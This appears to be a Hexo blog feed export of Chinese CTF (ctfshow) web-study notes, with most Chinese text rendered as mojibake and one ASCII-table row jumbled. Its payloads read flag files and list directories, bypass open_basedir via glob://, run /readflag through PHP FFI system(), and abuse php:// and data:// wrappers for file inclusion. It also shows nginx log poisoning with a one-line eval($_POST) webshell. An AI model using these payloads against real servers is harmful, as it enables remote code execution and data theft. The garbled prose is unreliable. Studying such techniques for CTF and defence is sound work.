æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªæ•°ç»„ä¸­</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file</span>(<span class="variable">$filename</span>)); </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file</span>(<span class="variable">$filename</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>); <span class="comment">// éphpä»£ç </span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$filename</span>); <span class="comment">// éphpä»£ç </span></span><br><span class="line"><span class="keyword">require</span>(<span class="variable">$filename</span>); <span class="comment">// éphpä»£ç </span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="variable">$filename</span>); <span class="comment">// éphpä»£ç </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// fopenå»è¯»å–æ–‡ä»¶å†…å®¹</span></span><br><span class="line"><span class="title function_ invoke__">fread</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>), <span class="variable">$size</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fread</span>(<span class="title function_ invoke__">popen</span>(<span class="string">&quot;cat flag&quot;</span>, <span class="string">&quot;r&quot;</span>), <span class="variable">$size</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgets</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>))); <span class="comment">// è¯»å–ä¸€è¡Œ</span></span><br><span class="line"><span class="title function_ invoke__">fpassthru</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>)); <span class="comment">// ä»å½“å‰ä½ç½®ä¸€ç›´è¯»å–åˆ° EOF</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgetcsv</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>), <span class="variable">$size</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgetss</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>))); <span class="comment">// ä»æ–‡ä»¶æŒ‡é’ˆä¸­è¯»å–ä¸€è¡Œå¹¶è¿‡æ»¤æ‰ HTML æ ‡è®°</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fscanf</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>),<span class="string">&quot;%s&quot;</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_ini_file</span>(<span class="variable">$filename</span>)); <span class="comment">// å¤±è´¥æ—¶è¿”å› false , æˆåŠŸè¿”å›é…ç½®æ•°ç»„</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="æŸ¥çœ‹å½“å‰ç›®å½•æ–‡ä»¶"><a href="#æŸ¥çœ‹å½“å‰ç›®å½•æ–‡ä»¶" class="headerlink" title="æŸ¥çœ‹å½“å‰ç›®å½•æ–‡ä»¶"></a>æŸ¥çœ‹å½“å‰ç›®å½•æ–‡ä»¶</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="string">&#x27;__FILE__&#x27;</span>)));</span><br></pre></td></tr></table></figure>

<h3 id="å¯¹scandirå‡½æ•°çš„æ›¿æ¢"><a href="#å¯¹scandirå‡½æ•°çš„æ›¿æ¢" class="headerlink" title="å¯¹scandirå‡½æ•°çš„æ›¿æ¢"></a>å¯¹scandirå‡½æ•°çš„æ›¿æ¢</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">glob</span>(<span class="string">&#x27;*&#x27;</span>)     ---ç”¨é€šé…ç¬¦æ¥ä¾¿åˆ©å…¨éƒ¨æ–‡ä»¶</span><br><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="keyword">foreach</span> (<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;.&#x27;</span>) <span class="keyword">as</span> <span class="variable">$f</span>) <span class="keyword">echo</span> <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getFilename</span>().<span class="string">&quot;\n&quot;</span>;<span class="keyword">exit</span>(<span class="number">0</span>);<span class="meta">?&gt;</span>    --.å¯ä»¥ç”¨glob:<span class="comment">//*è¿™ä¸ªä¼ªåè®®</span></span><br></pre></td></tr></table></figure>



<h3 id="ä¸æŸ¥çœ‹ç›¸å…³çš„å‡½æ•°-â€“php"><a href="#ä¸æŸ¥çœ‹ç›¸å…³çš„å‡½æ•°-â€“php" class="headerlink" title="ä¸æŸ¥çœ‹ç›¸å…³çš„å‡½æ•°  â€“php"></a>ä¸æŸ¥çœ‹ç›¸å…³çš„å‡½æ•°  â€“php</h3><table>
<thead>
<tr>
<th>å‡½æ•°</th>
<th>ç¤ºä¾‹</th>
<th>è¾“å‡ºæ•ˆæœ</th>
</tr>
</thead>
<tbody><tr>
<td>var_dump</td>
<td><code>var_dump($arr);</code></td>
<td>ç±»å‹+ç»“æ„+å€¼</td>
</tr>
<tr>
<td>echo</td>
<td><code>echo $arr;</code></td>
<td>æŠ¥é”™ï¼šæ•°ç»„ä¸èƒ½ echo</td>
</tr>
<tr>
<td>json_encode</td>
<td><code>echo json_encode($arr);</code></td>
<td><code>&#123;&quot;a&quot;:1,&quot;b&quot;:2&#125;</code></td>
</tr>
<tr>
<td>serialize</td>
<td><code>echo serialize($arr);</code></td>
<td><code>a:2:&#123;s:1:&quot;a&quot;;i:1;...&#125;</code></td>
</tr>
<tr>
<td>var_export</td>
<td><code>var_export($arr);</code></td>
<td><code>array (&#39;a&#39; =&gt; 1,...)</code></td>
</tr>
<tr>
<td>get_defined_vars</td>
<td>get_defined_vars()</td>
<td>è¿”å›æ•°ç»„é…åˆvar_exportå‡½æ•°ä½¿ç”¨</td>
</tr>
</tbody></table>
<h3 id="å¯¹ç›®å½•çš„ä¸€äº›æ“ä½œ"><a href="#å¯¹ç›®å½•çš„ä¸€äº›æ“ä½œ" class="headerlink" title="å¯¹ç›®å½•çš„ä¸€äº›æ“ä½œ"></a>å¯¹ç›®å½•çš„ä¸€äº›æ“ä½œ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">.      --å½“å‰ç›®å½•</span><br><span class="line">..     --ä¸Šä¸€çº§ç›®å½•</span><br><span class="line">../..  --ä¸Šä¸Šçº§ç›®å½•</span><br><span class="line">/      --æ ¹ç›®å½•</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="é€šè¿‡å¤åˆ¶æˆ–è€…é‡å‘½å"><a href="#é€šè¿‡å¤åˆ¶æˆ–è€…é‡å‘½å" class="headerlink" title="é€šè¿‡å¤åˆ¶æˆ–è€…é‡å‘½å"></a>é€šè¿‡å¤åˆ¶æˆ–è€…é‡å‘½å</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">copy</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);  <span class="comment">// å°†æ–‡ä»¶ä» source æ‹·è´åˆ° dest</span></span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);  <span class="comment">// å°è¯•æŠŠ oldname é‡å‘½åä¸º newname</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="å¦‚æœå‡ºç°ç¼“å†²åŒºä»£æ¢"><a href="#å¦‚æœå‡ºç°ç¼“å†²åŒºä»£æ¢" class="headerlink" title="å¦‚æœå‡ºç°ç¼“å†²åŒºä»£æ¢"></a>å¦‚æœå‡ºç°ç¼“å†²åŒºä»£æ¢</h2> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();	<span class="comment">// è¿”å›è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹</span></span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();	<span class="comment">// æ¸…ç©ºï¼ˆæ“¦é™¤ï¼‰ç¼“å†²åŒºå¹¶å…³é—­è¾“å‡ºç¼“å†²</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">ä½¿ç”¨<span class="keyword">exit</span>();æå‰é€€å‡ºå³å¯</span><br></pre></td></tr></table></figure>

<h2 id="open-basedirçš„é™åˆ¶"><a href="#open-basedirçš„é™åˆ¶" class="headerlink" title="open_basedirçš„é™åˆ¶"></a>open_basedirçš„é™åˆ¶</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">open_basedirï¼šå°†PHPæ‰€èƒ½æ‰“å¼€çš„æ–‡ä»¶é™åˆ¶åœ¨æŒ‡å®šçš„ç›®å½•æ ‘ä¸­ï¼ŒåŒ…æ‹¬æ–‡ä»¶æœ¬èº«ã€‚</span><br><span class="line">å½“ç¨‹åºè¦ä½¿ç”¨ä¾‹å¦‚<span class="title function_ invoke__">fopen</span>()æˆ–<span class="title function_ invoke__">file_get_contents</span>()æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œè¿™ä¸ªæ–‡ä»¶çš„ä½ç½®å°†ä¼šè¢«æ£€æŸ¥ã€‚å½“æ–‡ä»¶åœ¨æŒ‡å®šçš„ç›®å½•æ ‘ä¹‹å¤–ï¼Œç¨‹åºå°†æ‹’ç»æ‰“å¼€</span><br></pre></td></tr></table></figure>

<h3 id="1-ä½¿ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°"><a href="#1-ä½¿ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°" class="headerlink" title="1.ä½¿ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°"></a>1.ä½¿ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å› ä¸ºopen_basedirçš„è®¾ç½®åªæ˜¯å¯¹ç›®å½•çš„é™åˆ¶ï¼Œå¯¹systemç­‰å‘½ä»¤æ‰§è¡Œå‡½æ•°æ˜¯æ— æ•ˆçš„</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-ä½¿ç”¨ä¼ªåè®®-å¾—ä¸åˆ°æ–‡ä»¶å†…å®¹"><a href="#2-ä½¿ç”¨ä¼ªåè®®-å¾—ä¸åˆ°æ–‡ä»¶å†…å®¹" class="headerlink" title="2.ä½¿ç”¨ä¼ªåè®®(å¾—ä¸åˆ°æ–‡ä»¶å†…å®¹)"></a>2.ä½¿ç”¨ä¼ªåè®®(å¾—ä¸åˆ°æ–‡ä»¶å†…å®¹)</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="keyword">foreach</span> (<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>) <span class="keyword">as</span> <span class="variable">$f</span>) <span class="keyword">echo</span> <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getFilename</span>().<span class="string">&quot;\n&quot;</span>;<span class="keyword">exit</span>(<span class="number">0</span>);<span class="meta">?&gt;</span>   ---ä½¿ç”¨çš„æ˜¯glob:<span class="comment">///ä¼ªåè®®ï¼Œä¸ç›´æ¥è§¦å‘ open_basedir æ£€æŸ¥å¯ç»•è¿‡</span></span><br></pre></td></tr></table></figure>

<h2 id="php7-4ä»¥ä¸Š-FFI"><a href="#php7-4ä»¥ä¸Š-FFI" class="headerlink" title="php7.4ä»¥ä¸Š(FFI)"></a>php7.4ä»¥ä¸Š(FFI)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="comment">//åˆ›å»ºä¸€ä¸ªsystemå¯¹è±¡</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="comment">//æ²¡æœ‰å›æ˜¾çš„     </span></span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="comment">//é€šè¿‡$ffiå»è°ƒç”¨systemå‡½æ•°</span></span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>webå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>æ–‡ä»¶åŒ…å«</title>
    <url>/2025/06/02/ctfshow/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><h3 id="åŒ…å«å‡½æ•°"><a href="#åŒ…å«å‡½æ•°" class="headerlink" title="åŒ…å«å‡½æ•°"></a>åŒ…å«å‡½æ•°</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">include</span>ï¼šæ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶æ—¶åªä¼šäº§ç”Ÿè­¦å‘Šï¼Œè„šæœ¬å°†ç»§ç»­æ‰§è¡Œã€‚</span><br><span class="line">- <span class="keyword">include_once</span>ï¼šå’Œ<span class="keyword">include</span>()è¯­å¥ç±»ä¼¼ï¼Œå”¯ä¸€åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶ä¸­çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«ã€‚</span><br><span class="line">- <span class="keyword">require</span>ï¼šæ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶æ—¶ä¼šäº§ç”Ÿè‡´å‘½é”™è¯¯ï¼Œå¹¶åœæ­¢è„šæœ¬ã€‚</span><br><span class="line">- <span class="keyword">require_once</span>ï¼šå’Œ<span class="keyword">require</span>()è¯­å¥ç±»ä¼¼ï¼Œå”¯ä¸€åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶ä¸­çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«ã€‚</span><br><span class="line">- <span class="title function_ invoke__">filter</span>():ä¹Ÿå¯ä»¥åŒ…å«ä¼ªåè®®</span><br></pre></td></tr></table></figure>



<h3 id="1-é€šè¿‡ä¼ªåè®®"><a href="#1-é€šè¿‡ä¼ªåè®®" class="headerlink" title="1.é€šè¿‡ä¼ªåè®®"></a>1.é€šè¿‡ä¼ªåè®®</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.php:<span class="comment">//filter  ä¸»è¦ç”¨äºè¯»å–æºç </span></span><br><span class="line"><span class="number">2</span>.php:<span class="comment">//input  ç»å¸¸ä½¿ç”¨file_get_contentsè·å–php://inputå†…å®¹</span></span><br><span class="line"><span class="number">3</span>.data:<span class="comment">//  æ‰§è¡Œå‘½ä»¤      </span></span><br><span class="line"><span class="number">4</span>.file:<span class="comment">//  è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</span></span><br><span class="line"><span class="number">5</span>.compress.zlib:<span class="comment">//     åè®®ç”¨äºè¯»å–å‹ç¼©æ–‡ä»¶</span></span><br></pre></td></tr></table></figure>

<h4 id="1-php-filter-ä½¿ç”¨æ–¹æ³•"><a href="#1-php-filter-ä½¿ç”¨æ–¹æ³•" class="headerlink" title="1.php:&#x2F;&#x2F;filter ä½¿ç”¨æ–¹æ³•"></a>1.php:&#x2F;&#x2F;filter ä½¿ç”¨æ–¹æ³•</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=è¿‡æ»¤å™¨å/resource=ç›®æ ‡æ–‡ä»¶        --åŸºæœ¬æ ¼å¼     --readå¯ä»¥æ”¹ä¸ºwrite </span></span><br><span class="line">                                        --é»˜è®¤æ˜¯readï¼Œæœ‰æ—¶å¯ä¸å†™read,å¯ä»¥ä¸åŠ è¿‡æ»¤å™¨</span><br><span class="line">ä¸€äº›è¿‡æ»¤å™¨:</span><br><span class="line">            convert.base64-encode	base64 ç¼–ç è¾“å‡º</span><br><span class="line">            convert.base64-decode	base64 è§£ç è¾“å…¥</span><br><span class="line">            convert.quoted-printable-encode	quoted-printable ç¼–ç </span><br><span class="line">            <span class="keyword">string</span>.strip_tags	å»é™¤ HTML/PHP æ ‡ç­¾      --php7.<span class="number">3</span>.xååºŸå¼ƒ</span><br><span class="line">            <span class="keyword">string</span>.rot13	ROT13 æ›¿æ¢åŠ å¯†</span><br><span class="line">            <span class="keyword">string</span>.toupper	å­—æ¯è½¬å¤§å†™</span><br><span class="line">            <span class="keyword">string</span>.tolower	å­—æ¯è½¬å°å†™</span><br><span class="line">                </span><br></pre></td></tr></table></figure>

<h4 id="2-php-input-ä½¿ç”¨æ–¹æ³•"><a href="#2-php-input-ä½¿ç”¨æ–¹æ³•" class="headerlink" title="2.php:&#x2F;&#x2F;input ä½¿ç”¨æ–¹æ³•:"></a>2.php:&#x2F;&#x2F;input ä½¿ç”¨æ–¹æ³•:</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//input                            --ç”¨äºè¯»å– HTTP è¯·æ±‚ä½“çš„åŸå§‹å†…å®¹</span></span><br></pre></td></tr></table></figure>

<h4 id="3-data-ä½¿ç”¨æ–¹æ³•"><a href="#3-data-ä½¿ç”¨æ–¹æ³•" class="headerlink" title="3.data:&#x2F;&#x2F;ä½¿ç”¨æ–¹æ³•"></a>3.data:&#x2F;&#x2F;ä½¿ç”¨æ–¹æ³•</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//&lt;mediatype&gt;[;base64],&lt;data&gt;       --mediatypeï¼ˆMIMEç±»å‹ï¼‰æ¯”å¦‚ï¼štext/plainã€text/html  </span></span><br><span class="line">                               --dataï¼Œå¿…é¡»æ˜¯å®Œæ•´çš„phpä»£ç </span><br><span class="line">mediatypeï¼ˆMIMEç±»å‹ï¼‰:</span><br><span class="line">                    text/plain	çº¯æ–‡æœ¬	âœ… æ¨èï¼Œç”¨äºæ‰§è¡Œ PHP ä»£ç </span><br><span class="line">                    text/html	HTML æ ¼å¼	âœ… ä¹Ÿèƒ½æ‰§è¡Œ PHPï¼Œæ˜¾ç¤ºä¸ºç½‘é¡µ</span><br><span class="line">                    text/xml	XML æ ¼å¼	é€šå¸¸ç”¨äºæ¥å£æµ‹è¯•</span><br><span class="line">                    application/json	JSON æ•°æ®	å¤šç”¨äº API</span><br><span class="line">                    application/x-www-form-urlencoded	è¡¨å•æ•°æ®ï¼ˆæ™®é€šPOSTï¼‰	API æ•°æ®ä¼ è¾“</span><br><span class="line">                    application/javascript	JS è„šæœ¬	é€šå¸¸ç”¨äºç½‘é¡µç¯å¢ƒï¼Œä¸ç”¨äºPHP</span><br><span class="line">                    image/png	å›¾ç‰‡	ä¸é€‚åˆæ‰§è¡Œ PHP</span><br></pre></td></tr></table></figure>

<h4 id="4-file-ä½¿ç”¨æ–¹æ³•"><a href="#4-file-ä½¿ç”¨æ–¹æ³•" class="headerlink" title="4.file:&#x2F;&#x2F;ä½¿ç”¨æ–¹æ³•"></a>4.file:&#x2F;&#x2F;ä½¿ç”¨æ–¹æ³•</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file:<span class="comment">//ç»å¯¹è·¯å¾„                 </span></span><br></pre></td></tr></table></figure>



<h3 id="2-é€šè¿‡æ—¥å¿—"><a href="#2-é€šè¿‡æ—¥å¿—" class="headerlink" title="2.é€šè¿‡æ—¥å¿—"></a>2.é€šè¿‡æ—¥å¿—</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=/<span class="keyword">var</span>/log/nginx/access.log     --é€šè¿‡nginxä¸­æ—¥å¿—çš„è·¯å¾„</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span>      --ä¸€å¥è¯æœ¨é©¬</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span>         --æŸ¥çœ‹é…ç½®ä¿¡æ¯</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>webå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>å¸¸è¯†</title>
    <url>/2025/06/02/ctfshow/%E5%B8%B8%E8%AF%86/</url>
    <content><![CDATA[<h2 id="1-asciiç "><a href="#1-asciiç " class="headerlink" title="1.asciiç :"></a>1.asciiç :</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[32, 128)   ---å¸¸è§ç¬¦å·</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>ç±»å‹</th>
<th>èŒƒå›´</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>æ§åˆ¶å­—ç¬¦</td>
<td>0~31</td>
<td>ä¸å¯è§ï¼ˆå¦‚å›è½¦ã€æ¢è¡Œï¼‰</td>
</tr>
<tr>
<td>å¯æ‰“å°å­—ç¬¦</td>
<td><strong>32~126</strong></td>
<td>å¸¸è§å­—ç¬¦ï¼ŒCTFçˆ†ç ´ä¸»åŠ›</td>
</tr>
<tr>
<td>åˆ é™¤ç¬¦</td>
<td>127</td>
<td><code>DEL</code> æ§åˆ¶ç¬¦</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>å­—ç¬¦</th>
<th>ASCII</th>
<th>åå…­è¿›åˆ¶</th>
<th>ç”¨é€”è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>&#39; &#39;</code>ï¼ˆç©ºæ ¼ï¼‰</td>
<td>32</td>
<td><code>0x20</code></td>
<td>SQLå…³é”®è¯åˆ†éš”</td>
</tr>
<tr>
<td><code>&#39;!&#39;</code></td>
<td>33</td>
<td><code>0x21</code></td>
<td>ç‰¹æ®Šå­—ç¬¦ç»•è¿‡</td>
</tr>
<tr>
<td><code>&#39;&quot;&#39;</code>ï¼ˆåŒå¼•å·ï¼‰</td>
<td>34</td>
<td><code>0x22</code></td>
<td>å­—ç¬¦ä¸²è¾¹ç•Œï¼Œéœ€è½¬ä¹‰</td>
</tr>
<tr>
<td><code>&#39;#&#39;</code></td>
<td>35</td>
<td><code>0x23</code></td>
<td>æ³¨é‡Šç¬¦ï¼ˆMySQLï¼‰</td>
</tr>
<tr>
<td><code>&#39;%&#39;</code></td>
<td>37</td>
<td><code>0x25</code></td>
<td>é€šé…ç¬¦ï¼ˆlikeä¸­ï¼‰</td>
</tr>
<tr>
<td><code>&#39;\&#39;&#39;</code>ï¼ˆå•å¼•å·ï¼‰</td>
<td>39</td>
<td><code>0x27</code></td>
<td>SQLå­—ç¬¦ä¸²è¾¹ç•Œï¼Œæ³¨å…¥å…³é”®ç¬¦å·</td>
</tr>
<tr>
<td><code>&#39;(&#39;</code></td>
<td>40</td>
<td><code>0x28</code></td>
<td>è¡¨è¾¾å¼å¼€å§‹</td>
</tr>
<tr>
<td><code>&#39;)&#39;</code></td>
<td>41</td>
<td><code>0x29</code></td>
<td>è¡¨è¾¾å¼ç»“æŸ</td>
</tr>
<tr>
<td><code>&#39;*&#39;</code></td>
<td>42</td>
<td><code>0x2a</code></td>
<td>é€šé…ç¬¦ï¼Œå¦‚ <code>SELECT *</code></td>
</tr>
<tr>
<td><code>&#39;+&#39;</code></td>
<td>43</td>
<td><code>0x2b</code></td>
<td>åŠ æ³•&#x2F;å­—ç¬¦ä¸²æ‹¼æ¥</td>
</tr>
<tr>
<td><code>&#39;,&#39;</code></td>
<td>44</td>
<td><code>0x2c</code></td>
<td>å¤šå‚æ•°åˆ†éš”</td>
</tr>
<tr>
<td><code>&#39;-&#39;</code></td>
<td>45</td>
<td><code>0x2d</code></td>
<td>å‡å·&#x2F;æ³¨é‡Šå¼€å§‹ï¼ˆâ€“ï¼‰</td>
</tr>
<tr>
<td><code>&#39;.&#39;</code></td>
<td>46</td>
<td><code>0x2e</code></td>
<td>è¡¨.å­—æ®µç»“æ„è¡¨ç¤º</td>
</tr>
<tr>
<td><code>&#39;/&#39;</code></td>
<td>47</td>
<td><code>0x2f</code></td>
<td>æ³¨é‡Šç¬¦ï¼ˆ<code>/*!</code>ï¼‰æˆ–è·¯å¾„</td>
</tr>
<tr>
<td><code>&#39;0&#39; ~ &#39;9&#39;</code></td>
<td>48~57</td>
<td><code>0x30</code> ~ <code>0x39</code></td>
<td>æ•°å­—å­—ç¬¦ï¼Œå¸ƒå°”æ¯”è¾ƒå¯¹è±¡</td>
</tr>
<tr>
<td><code>&#39;:&#39;</code></td>
<td>58</td>
<td><code>0x3a</code></td>
<td>URL å‚æ•°åˆ†éš”ã€ç«¯å£ç¬¦å·</td>
</tr>
<tr>
<td><code>&#39;;&#39;</code></td>
<td>59</td>
<td><code>0x3b</code></td>
<td>SQLè¯­å¥ç»“æŸç¬¦ï¼Œæ³¨å…¥å…³é”®ç¬¦å·</td>
</tr>
<tr>
<td><code>&#39;&lt;&#39;</code></td>
<td>60</td>
<td><code>0x3c</code></td>
<td>HTMLæ ‡ç­¾ã€æ¯”è¾ƒç¬¦</td>
</tr>
<tr>
<td><code>&#39;=&#39;</code></td>
<td>61</td>
<td><code>0x3d</code></td>
<td>åˆ¤æ–­æ¡ä»¶</td>
</tr>
<tr>
<td><code>&#39;&gt;&#39;</code></td>
<td>62</td>
<td><code>0x3e</code></td>
<td>HTMLæ ‡ç­¾ã€æ¯”è¾ƒç¬¦</td>
</tr>
<tr>
<td><code>&#39;?&#39;</code></td>
<td>63</td>
<td><code>0x3f</code></td>
<td>GET å‚æ•°æ ‡å¿—ä½</td>
</tr>
<tr>
<td><code>&#39;A&#39; ~ &#39;Z&#39;</code></td>
<td>65~90</td>
<td><code>0x41</code> ~ <code>0x5A</code></td>
<td>å¤§å†™å­—æ¯ï¼Œå¸¸ç”¨äºFLAGæˆ–è¡¨å­—æ®µ</td>
</tr>
<tr>
<td><code>&#39;a&#39; ~ &#39;z&#39;</code></td>
<td>97~122</td>
<td><code>0x61</code> ~ <code>0x7A</code></td>
<td>å°å†™å­—æ¯ï¼Œå¸¸ç”¨äºflagçˆ†ç ´</td>
</tr>
<tr>
<td><code>&#39;&#123;&#39;</code></td>
<td>123</td>
<td><code>0x7b</code></td>
<td>FLAG å¼€å§‹ï¼ˆå¦‚ ctfshow{ï¼‰</td>
</tr>
<tr>
<td><code>&#39;&#125;&#39;</code></td>
<td>125</td>
<td><code>0x7d</code></td>
<td>FLAG ç»“æŸ</td>
</tr>
<tr>
<td>&#96;â€™</td>
<td>â€˜&#96;</td>
<td>124</td>
<td><code>0x7c</code></td>
</tr>
<tr>
<td><code>&#39;~&#39;</code></td>
<td>126</td>
<td><code>0x7e</code></td>
<td>ç»•è¿‡ä¸­ç”¨</td>
</tr>
<tr>
<td><code>&#39;\x00&#39;</code></td>
<td>0</td>
<td><code>0x00</code></td>
<td>ç©ºå­—èŠ‚ï¼Œå¸¸ç”¨äºç»•è¿‡ç»ˆæ­¢</td>
</tr>
</tbody></table>
<h3 id="pythonä¸­asciiå’Œå­—æ¯äº’è½¬"><a href="#pythonä¸­asciiå’Œå­—æ¯äº’è½¬" class="headerlink" title="pythonä¸­asciiå’Œå­—æ¯äº’è½¬;"></a>pythonä¸­asciiå’Œå­—æ¯äº’è½¬;</h3><table>
<thead>
<tr>
<th>å‡½æ•°</th>
<th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody><tr>
<td><code>chr(ASCIIå€¼)</code></td>
<td>æŠŠ ASCII æ•°è½¬æˆå­—ç¬¦</td>
</tr>
<tr>
<td><code>ord(å­—ç¬¦)</code></td>
<td>æŠŠå­—ç¬¦è½¬æˆ ASCII æ•°</td>
</tr>
</tbody></table>
<h2 id="2-windowsä¸­cmdä¸linxuå‘½ä»¤çš„åŒºåˆ«"><a href="#2-windowsä¸­cmdä¸linxuå‘½ä»¤çš„åŒºåˆ«" class="headerlink" title="2.windowsä¸­cmdä¸linxuå‘½ä»¤çš„åŒºåˆ«:"></a>2.windowsä¸­cmdä¸linxuå‘½ä»¤çš„åŒºåˆ«:</h2><h3 id="æ¸…ç†å‘½ä»¤-clear"><a href="#æ¸…ç†å‘½ä»¤-clear" class="headerlink" title="æ¸…ç†å‘½ä»¤(clear):"></a>æ¸…ç†å‘½ä»¤(clear):</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cls</span>   --<span class="built_in">cmd</span>å‘½ä»¤</span><br><span class="line">clear  --linxuå‘½ä»¤</span><br></pre></td></tr></table></figure>

